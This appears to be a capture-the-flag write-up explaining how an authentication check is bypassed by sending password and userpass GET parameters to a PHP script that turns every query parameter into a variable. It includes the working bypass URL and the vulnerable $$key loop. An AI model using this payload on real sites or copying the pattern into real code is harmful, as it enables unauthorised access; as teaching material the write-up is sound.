### Solution

    moo.com/index.php?password=x&userpass=x

### Explanation

The hack is done in the following code :

    foreach ($_GET as $key => $value)
            { 
              $$key = $value; 
            }

\$\_GET is an array and basically this code means : \${\$key} = \$value
for each value you put in \$\_GET So if you put in \$\_GET password=x
and userpass=x you'll have: \$\_GET[password]=x and \$\_GET[userpass]=x
and the foreach will do \$password=x; \$userpass=x; and we will have
\$userpass == \$password
